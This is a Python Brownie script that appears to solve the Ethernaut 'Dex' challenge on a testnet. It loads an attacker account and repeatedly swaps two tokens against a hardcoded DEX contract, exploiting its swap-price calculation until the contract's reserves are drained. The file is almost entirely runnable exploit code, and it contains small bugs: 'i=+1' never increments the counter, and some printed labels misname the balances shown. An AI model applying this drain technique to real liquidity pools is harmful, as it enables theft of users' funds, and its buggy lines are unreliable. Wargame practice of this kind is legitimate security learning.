from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# target_ct=Denial.deploy({'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xdb5dd0e45F9DF1c1f0081dafE75e7D2366785bB3'
target_ct=interface.Dex(target_address)

# deploy attacker contract
# attacker_contract=shopAttack.deploy(target_ct.address, {'from': attacker, 'priority_fee': priority_fee})
# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    token1=target_ct.token1()
    token2=target_ct.token2()
    print('--- values addresses ---')
    print('target_ct.token1():', token1)
    print('target_ct.token2():', token2)
    print('attacker:', attacker)
    # print('attacker_contract:', attacker_contract)

    print('--- values BEFORE attack ---')
    # print('deployer:', deployer)
    print('target_ct balance token1:', target_ct.balanceOf(token1, target_address))
    print('target_ct balance token2:', target_ct.balanceOf(token2, target_address))
    print('attacker balance token1:', target_ct.balanceOf(token1, attacker))
    print('attacker balance token2:', target_ct.balanceOf(token2, attacker))
    print('target_ct price to buy token 2 for selling 1 token1:', target_ct.getSwapPrice(token1, token2, 1))

    fromToken=token1
    toToken=token2
    i=0

    while target_ct.balanceOf(token1, target_address) != 0 or target_ct.balanceOf(token2, target_address) != 0:

        if target_ct.balanceOf(token1, attacker) > 0:
            fromToken=token1
            toToken=token2
        else:
            fromToken=token2
            toToken=token1

        amount=target_ct.balanceOf(fromToken, attacker)
        buy_amount=target_ct.getSwapPrice(fromToken, toToken, amount)

        # when the amount to buy is higher than the amount in the dex contract, we buy only the available amount
        if buy_amount > target_ct.balanceOf(toToken, target_ct):
            amount=target_ct.balanceOf(fromToken, target_ct)

        print(f'swap {amount} {fromToken} for {toToken}')
        tx_approve=target_ct.approve(target_address, amount, {'from': attacker, 'priority_fee': priority_fee})
        tx=target_ct.swap(fromToken, toToken, amount, {'from': attacker, 'priority_fee': priority_fee})
        i=+1
        print(f'--- values after swap {i} ---')
        print('target_ct balance token1:', target_ct.balanceOf(token1, target_address))
        print('target_ct balance token2:', target_ct.balanceOf(token2, target_address))
        print('target_ct balance token1:', target_ct.balanceOf(token1, attacker))
        print('target_ct balance token2:', target_ct.balanceOf(token2, attacker))


    print('--- It is over ---')
   